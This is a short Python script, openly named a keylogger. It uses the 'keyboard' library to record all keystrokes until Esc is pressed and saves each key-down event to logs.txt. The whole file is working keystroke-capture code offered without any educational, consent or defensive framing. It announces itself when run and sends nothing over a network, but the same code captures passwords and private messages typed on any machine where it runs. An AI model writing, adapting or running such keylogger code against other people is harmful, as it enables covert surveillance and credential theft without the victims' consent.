import keyboard

def keylogger():
    print("Keylogger started. Press 'Esc' to stop.")
    keyboard.start_recording()
    keyboard.wait('esc')
    recorded_keys = keyboard.stop_recording()
    
    with open("logs.txt", "w") as f:
        for ejecucion in recorded_keys:
            if ejecucion.event_type == keyboard.KEY_DOWN:
                f.write(f"{ejecucion.name}\n")

    print("Keylogger stopped. Keys saved to logs.txt.")

if __name__ == "__main__":
    keylogger()